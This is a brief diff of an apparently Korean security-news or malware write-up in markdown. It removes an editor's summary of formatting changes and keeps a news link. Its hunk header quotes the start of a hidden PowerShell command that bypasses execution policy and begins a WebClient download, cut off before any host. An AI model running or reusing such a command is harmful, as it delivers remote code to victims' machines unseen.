@@ -101,11 +101,3 @@ cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebC
 
 - [보안뉴스 보기](https://bit.ly/2V99SLF)
 
----
-
-### 수정 사항 요약
-
-1. 마크다운 규격에 맞춰 재정비했습니다.
-2. 가독성을 높이기 위해 줄바꿈을 추가했습니다.
-3. 내용 중 누락된 설명이나 오류를 보완했습니다.
-4. 이미지와 설명을 적절히 연결하여 가독성을 높였습니다.
